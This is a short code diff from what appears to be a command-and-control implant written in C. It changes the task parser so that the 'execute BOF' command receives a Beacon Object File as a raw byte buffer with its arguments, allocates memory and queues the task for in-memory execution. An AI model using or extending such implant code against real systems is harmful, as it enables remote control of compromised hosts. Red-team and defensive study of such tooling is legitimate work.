@@ -760,7 +760,7 @@ SECTION_CODE void deserialize_get_tasks_response(char *buffer)
             
             tlv_type = ReadUint8(&buffer);
 
-             if(tlv_type == TLV_CMD_ID){
+            if(tlv_type == TLV_CMD_ID){
                 param1_uint32 = ReadUint32(&buffer);
                 task.task_uuid = ReadString(&buffer, param1_uint32); // Freed in post_tasks
             }
@@ -1152,22 +1152,25 @@ SECTION_CODE void deserialize_get_tasks_response(char *buffer)
 #ifdef INCLUDE_CMD_EXECUTE_BOF
         case CMD_EXECUTE_BOF_MESSAGE:
             tlv_type = ReadUint8(&buffer);
+
             if (tlv_type == TLV_CMD_ID) {
                 param1_uint32 = ReadUint32(&buffer);
                 task.task_uuid = ReadString(&buffer, param1_uint32); // Freed in post_tasks
             }
 
             tlv_type = ReadUint8(&buffer);
-            if (tlv_type == TLV_CMD_EXECUTE_BOF_PATH) {
+            
+            if (tlv_type == TLV_CMD_EXECUTE_BOF_ARGS) {
                 param1_uint32 = ReadUint32(&buffer);
                 param1_lpvoid = ReadBytes(&buffer, param1_uint32);
             }
-            // tlv_type = ReadUint8(&buffer);
-            // if (tlv_type == TLV_CMD_EXECUTE_BOF_ARGS) {
-            //     param2_uint32 = ReadUint32(&buffer);
-            //     param2_lpvoid = ReadBytes(&buffer, param1_uint32);
-            // }
-            
+    
+            tlv_type = ReadUint8(&buffer);
+
+            if (tlv_type == TLV_CMD_EXECUTE_BOF_BUFFER) { 
+                param2_uint32 = ReadUint32(&buffer);
+                param2_lpvoid = ReadBytes(&buffer, param2_uint32);
+            }
 
             task.cmd_id = CMD_EXECUTE_BOF_MESSAGE;
             task.cmd = (CMD_EXECUTE_BOF *)hannibal_instance_ptr->Win32.VirtualAlloc(NULL, sizeof(CMD_EXECUTE_BOF), MEM_COMMIT, PAGE_READWRITE);
@@ -1176,10 +1179,11 @@ SECTION_CODE void deserialize_get_tasks_response(char *buffer)
             }
             bof = (CMD_EXECUTE_BOF *)task.cmd;
             
-            bof->path_bof = param1_lpvoid;
-            bof->path_bof_size = param1_uint32;
-            // bof->args = param2_lpvoid;
-            // bof->arg_size = param2_uint32;
+            bof->args = param1_lpvoid;
+            bof->arg_size = param1_uint32;
+            bof->bof = param2_lpvoid;
+            bof->bof_size = param2_uint32;
+            
             task_enqueue(hannibal_instance_ptr->tasks.tasks_queue, &task);
             
             break;
